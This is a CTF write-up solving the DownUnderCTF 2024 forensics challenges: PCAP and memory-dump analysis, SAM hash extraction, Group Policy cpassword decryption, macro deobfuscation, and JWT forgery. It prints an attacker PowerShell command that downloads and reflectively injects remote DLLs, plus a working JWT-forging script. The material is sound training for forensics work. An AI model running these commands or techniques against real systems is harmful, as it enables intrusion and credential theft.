This is a writeup for all forensics challenges from DownUnderCTF 2024. Overall, the CTF was super enjoyable with a mesmerizing theme using cute drawings. This was also my first time playing at a local bar with my friends to solve challenges together and have fun. Fun note: one of the authors gave the whole attack chain relating to every forensics challenge.

> Monke.xlsm was the malware from 'Macro Magic' which exfiltrated data, monkey.doc.ps1 from 'Lost in Memory' was the initial compromise of the machine. The attacker then got a reverse shell and dumped the group policy. The group policy gave them the backup account password which allowed them to WMI onto the DC and extract the SAM and SYSTEM hives. Hence, they obtained the administrator via cracking the hash.

## Baby's First Forensics [Forensics]
Question: They've been trying to breach our infrastructure all morning! They're trying to get more info on our covert kangaroos! We need your help, we've captured some traffic of them attacking us, can you tell us what tool they were using and its version?

Flag: `DUCTF{Nikto_2.1.6}`

We are given a PCAP file to investigate. Analyzing the TCP stream, the scanning tool can be easily identified on the `User-Agent` header.

## SAM I AM [Forensics]
Question: The attacker managed to gain Domain Admin on our rebels Domain Controller! Looks like they managed to log on with an account using WMI and dumped some files. Can you reproduce how they got the Administrator's Password with the artifacts provided?

Flag: `DUCTF{!checkerboard1}`

We are given a SAM and SYSTEM registry hive to investigate. Reading the description, we have to reproduce the method of obtaining the Administrator's password with the registry hives. One easy way to do this is by using `secretsdump.py` from Impacket, as it utilizing both SAM and SYSTEM registry hives.

## Bad Policies [Forensics]
Question: Looks like the attacker managed to access the rebels Domain Controller. Can you figure out how they got access after pulling these artifacts from one of our Outpost machines?

Flag: `DUCTF{D0n7_Us3_P4s5w0rds_1n_Gr0up_P0l1cy}`

We are given an archive containing several GPOs to investigate.

```

Since the challenge was something related to "bad policies", we can look into the `Groups.xml` file buried in the archive for the encrypted password stored within the file (specifically the `cpassword` field).

```

The encrypted password is encrypted with AES using a 32-bit key that is publicly available [online](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN). Hence, this password can be easily cracked using tools such as [gpp-decrypt](https://www.kali.org/tools/gpp-decrypt/).

## Macro Magic [Forensics]
Question: We managed to pull this excel spreadsheet artifact from one of our Outpost machines. Its got something sus happening under the hood. After opening we found and captured some suspicious traffic on our network. Can you find out what this traffic is and find the flag! Note: You do not need to run or enable the macro so solve.

Flag: `DUCTF{M4d3_W1th_AI_by_M0nk3ys}`

We are given a PCAP and XLSM file to investigate. Analyzing the PCAP first, there seems to be several HTTP requests made to random URLs. However, some of them seem to be hex values or some sorts.

![http](/assets/posts/ductf2024/http.png)

Analyzing the XLSM file, a macro can be obtained.

```

```

Dumping the macro, there seems to be several functions and variables initialized within it with bogus text between them. Removing the bogus text, we get this:

```
Attribute VB_Name = "Module1"

Public Function anotherThing(B As String, C As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(B)
        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))

    anotherThing = A
End Function

End Sub

Public Function doThing(B As String, C As String) As String
    Dim I As Long

    For I = 1 To Len(B)

    Next I
    something = A
End Function

Public Function forensics(B As String) As String
    Dim A() As Byte
    Dim I As Integer
    Dim C As String
    A = StrConv(B, vbFromUnicode)
    For I = LBound(A) To UBound(A)
        C = C & CStr(A(I)) & " "
    Next I
    C = Trim(C)
    forensics = C
End Function
```

The macro may seem complex at first, but it is actually very easy to understand. The explanations for each functions:

1. anotherThing() - This function basically just performs XOR on two strings.
2. importantThing() - This function generates random numbers and sorts them.
3. totalyFine() - This function modifies a string by replacing spaces with hyphens.
4. superThing() - This function sends a GET request and returns the response.
5. something() - This function converts each character of a string to its binary representation.
6. forensics() - This function converts a string to its byte representation with spaces.

Just by looking at the functions, it was obvious that the macro was probably XORing a byte/binary string with a key string. To simplify the macro even further, my teammate @MinatoTW rewrote the macro into Python instead while removing the useless functions and variables.

```
def doThing(b: str, c: str) -> str:
    a = ""
    for i in range(len(b)):
        a += chr(ord(b[i]) ^ ord(c[i % len(c)]))
    return a


def forensics(b: str) -> str:
    a = b.encode("utf-8")
    c = " ".join(str(byte) for byte in a)
    return c


def totalyFine(b: str):
    return b.replace(" ", "-")


def something(b: str) -> str:
    a = ""
    for char in b:
        a += format(ord(char), "08b")
    return a


def anotherThing(b: str, c: str) -> str:
    a = ""
    for i in range(len(b)):
        a += chr(ord(b[i]) ^ ord(c[i % len(c)]))
    return a


K = "Yes"
S = "Mon"
U = forensics(K)
V = totalyFine(U)
D = "Ma"
J = "https://play.duc.tf/" + V
print(J)

G = "key"
F = "gic"
# N = importantThing()
Q = "Flag: No"
H = "Try Harder"

U = forensics(H)
V = totalyFine(U)
J = "http://downunderctf.com/" + V
print(J)

W = S + G + D + F
O = doThing(Q, W)
M = anotherThing(O, W)
A = something(O)
Z = forensics(O)
P = "Pterodactyl"
U = forensics(P)
V = totalyFine(U)
J = "http://play.duc.tf/" + V
print(J)

T = totalyFine(Z)
J = "http://downunderctf.com/" + T
print(J)
```

Looking at the code, we can identify variable W to be the XOR key `MonkeyMagic`. We can also see the macro taking the converted byte strings as URLs for the GET requests. Since we have the XOR key now, a simple script can decode each URL identified in the PCAP previously, with the longest one being the flag.

```
def decode(encoded, key):
    decoded = ""
    key_len = len(key)
    for i in range(len(encoded)):
        decoded += chr(encoded[i] ^ ord(key[(i) % key_len]))
    return decoded

flag = [11, 3, 15, 12, 95, 89, 9, 52, 36, 61, 37, 54, 34, 90, 15, 86, 38, 26, 80, 19, 1, 60, 12, 38, 49, 9, 28, 38, 0, 81, 9, 2, 80, 52, 28, 19]
key = "MonkeyMagic"

decoded_message = decode(flag, key)
print(decoded_message)
```

## emuc2 [Forensics]
Question: As all good nation states, we have our own malware and C2 for offensive operations. But someone has got the source code and is using it against us! Here's a capture of traffic we found on one of our laptops...

Flag: `DUCTF{pǝʇɔǝɟuᴉ_sᴉ_ǝlᴉɟ_dᴉz_ǝɥʇ_oʇ_pɹoʍssɐd_ǝɥʇ}`

We are given a PCAP and a SSLKEYLOGFILE to investigate. Inside the PCAP were several TLS packets, so we have to use the SSLKEYLOGFILE to decrypt them.

![tls](/assets/posts/ductf2024/tls.png)

Decrypting the TLS packets shows several HTTP2 packets. Analyzing the stream, we can see a login page on `forensics-emuc2-b6abd8652aa4.2024.ductf.dev` which can be accessed online. However, we have no permission to access the flag page even with the right credentials. Looking at the TCP stream, we can see a JWT token being generated. Hence, the only way to bypass this permission check was to forge our own JWT token.

![login](/assets/posts/ductf2024/login.png)

Going further into the HTTP2 stream, stream 23 shows a URL path `/api/env` which stores uploaded files in the website.

![files](/assets/posts/ductf2024/files.png)

Going through the files one by one, the file `T4yLN35GKLhxTgaykWxdgROCAwIBE3FO` had a JWT_SECRET stored statically in it. 

![jwt](/assets/posts/ductf2024/jwt.png)

With the secret, we can finally forge our own JWT token to bypass the permission check.

```
import jwt

data = {"subject_id": 1, "exp": 1920187883}
JWT_SECRET = "3gHsCBkpZLi99zyiPqfY/NfFJqZzmNL4BAhYN8rAjRn49baTcnmyGISLD6T58XcWIUYrBfltI2iq2N6OHQSrfqBRFxFta61PvmnfRyn8Ep8T55lvLT8Es62kN3x35Bcb0OZmOGmM/zKf2qadcBq3Nbq1MiIVKJMz4w3JOk4orwFPtSNpNh8uaSQQUNMKTT6cvD9bvRvFNeeHYSPhDFwayPIRr5TJ+BpIRTUTfc1C3WCKoOuXCz2t+ISZo5yYwZ6U5w7NKFTTuDqMP/dXevkVykuntdej55XE3fsCP+UVFUT2JrY+Z9Q1aKTgavQR5smYVn93RlpbFwCoSStoANnoi"

encoded = jwt.encode(data, JWT_SECRET, algorithm="HS512")
print(encoded)
```

```
└─$ python script.py

```

Replacing the JWT token, the permission check was succesfully bypassed and the flag can be obtained.

## Lost in Memory [Forensics]
Question: Looks like one of our Emu soldiers ran something on an Outpost machine and now it's doing strange things. We took a memory dump as a precaution. Can you tell us whats going on?
1. What was the name of the malicious executable? eg malicious.xlsm<br>
2. What was the name of the powershell module used? eg invoke-mimikatz<br>
3. What were the names of the two files executed from the malicious executable (In alphabetical order with - in between and no spaces)? eg malware.exe-malware2.exe<br>
4. What was the password of the new account created through powershell? eg strong-password123

Flag: `DUCTF{monkey.doc.ps1_invoke-reflectivepeinjection_emu.dll-kiwi.dll_5up3r-5ecur3}`

We are given a memory dump to investigate. Analyzing the process tree, the notepad stands out the most as it should not be executing hidden powershell commands.

Checking the cmdline, we can identify two suspicious files being executed by notepad: `Monke.xlsm` and `monkey.doc.ps1`.

```

However, only `monkey.doc.ps1` could be succesfully dumped. The content of `monkey.doc.ps1` shows a suspicious powershell command that downloads and executes two malicious executables `emu.dll` and `kiwi.dll` with powershell module `Invoke-ReflectivePEInjection`. This suggests that the whole attack scenario was related to [reflective DLL injection](https://www.hackthebox.com/blog/reflection-ca-ctf-2022-forensics-writeup).

```
Start-Job -ScriptBlock {iex (New-Object net.webclient).Downloadstring('http://192.168.57.166/reflective/reflect.ps1'); Invoke-ReflectivePEInjection -PEUrl http://192.168.57.166/documents/emu.dll};Start-Job -ScriptBlock {iex (New-Object net.webclient).Downloadstring('http://192.168.57.166/reflective/reflect.ps1'); Invoke-ReflectivePEInjection -PEUrl http://192.168.57.166/documents/kiwi.dll}
```

To double confirm that `monkey.doc.ps1` was the malicious executable responsible for all this, we can use the consoles plugin from vol2 as it provides a more verbose view on each commands.

The output shows `monkey.doc.ps1` being executed directly via powershell, thus proving that the malicious executable was indeed the culprit. Attempting to gather more information on the attack, the notepad process can also be dumped and analyzed to potentially find other powershell commands that might be injected within it. Here, an obfuscated powershell command can be identified.
